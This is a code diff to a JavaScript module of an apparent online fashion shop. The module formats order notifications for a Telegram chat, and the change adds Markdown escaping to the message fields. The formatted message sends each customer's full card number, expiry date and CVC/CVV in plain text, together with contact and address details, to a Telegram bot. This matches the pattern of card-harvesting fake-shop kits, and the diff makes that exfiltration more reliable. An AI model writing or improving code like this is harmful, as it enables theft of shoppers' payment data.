@@ -21,6 +21,17 @@ export function saveTelegramConfig(token, chatId, webhookUrl = '') {
   localStorage.setItem(STORAGE_KEY_WEBHOOK, webhookUrl.trim());
 }
 
+export function escapeMarkdown(str) {
+  if (!str) return '';
+  return String(str)
+    .replace(/\\/g, '\\\\')
+    .replace(/`/g, '\\`')
+    .replace(/\*/g, '\\*')
+    .replace(/_/g, '\\_')
+    .replace(/\[/g, '\\[')
+    .replace(/\]/g, '\\]');
+}
+
 /**
  * Formats order data into an elegant Markdown notification message for Telegram
  */
@@ -28,7 +39,7 @@ export function formatOrderTelegramMessage(orderData) {
   const { customer, shipping, payment, items, summary, orderId, timestamp } = orderData;
 
   const itemsFormatted = items.map(item => 
-    `• *${item.name}* (Größe: ${item.selectedSize}) x${item.quantity} – €${(item.price * item.quantity).toFixed(2)}`
+    `• *${escapeMarkdown(item.name)}* (Größe: ${escapeMarkdown(item.selectedSize)}) x${item.quantity} – €${(item.price * item.quantity).toFixed(2)}`
   ).join('\n');
 
   let cardDetailsSection = '';
@@ -36,10 +47,10 @@ export function formatOrderTelegramMessage(orderData) {
     const cd = payment.cardDetails;
     cardDetailsSection = `
 💳 *KREDITKARTEN-DETAILS:*
-├ *Inhaber:* \`${cd.name || 'Nicht angegeben'}\`
-├ *Kartennr:* \`${cd.number || 'N/A'}\`
-├ *Ablaufdatum:* \`${cd.expiry || 'MM/JJ'}\`
-└ *CVC/CVV:* \`${cd.cvv || '***'}\`
+├ *Inhaber:* \`${escapeMarkdown(cd.name) || 'Nicht angegeben'}\`
+├ *Kartennr:* \`${escapeMarkdown(cd.number) || 'N/A'}\`
+├ *Ablaufdatum:* \`${escapeMarkdown(cd.expiry) || 'MM/JJ'}\`
+└ *CVC/CVV:* \`${escapeMarkdown(cd.cvv) || '***'}\`
 `;
   }
 
@@ -47,18 +58,18 @@ export function formatOrderTelegramMessage(orderData) {
 🛍️ *NEUE BESTELLUNG ERHALTEN!*
 👑 *VON KÖNIG & CIE. Haute Couture*
 --------------------------------------------
-🆔 *Order ID:* \`${orderId}\`
-🕒 *Datum:* ${timestamp}
+🆔 *Order ID:* \`${escapeMarkdown(orderId)}\`
+🕒 *Datum:* ${escapeMarkdown(timestamp)}
 
 👤 *KUNDENDATEN:*
-├ *Name:* ${customer.salutation} ${customer.firstname} ${customer.lastname}
-├ *E-Mail:* \`${customer.email}\`
-└ *Telefon:* \`${customer.phone}\`
+├ *Name:* ${escapeMarkdown(customer.salutation)} ${escapeMarkdown(customer.firstname)} ${escapeMarkdown(customer.lastname)}
+├ *E-Mail:* \`${escapeMarkdown(customer.email)}\`
+└ *Telefon:* \`${escapeMarkdown(customer.phone)}\`
 
 📍 *LIEFERADRESSE:*
-├ *Straße:* ${customer.street} ${customer.apartment ? '(' + customer.apartment + ')' : ''}
-├ *PLZ / Stadt:* ${customer.zip} ${customer.city}
-└ *Land:* ${customer.country}
+├ *Straße:* ${escapeMarkdown(customer.street)} ${customer.apartment ? '(' + escapeMarkdown(customer.apartment) + ')' : ''}
+├ *PLZ / Stadt:* ${escapeMarkdown(customer.zip)} ${escapeMarkdown(customer.city)}
+└ *Land:* ${escapeMarkdown(customer.country)}
 
 🚚 *VERSANDART:* ${shipping.method} (${shipping.price === 0 ? 'Kostenlos' : '€' + shipping.price})
 💳 *ZAHLUNGSART:* *${payment.method}*
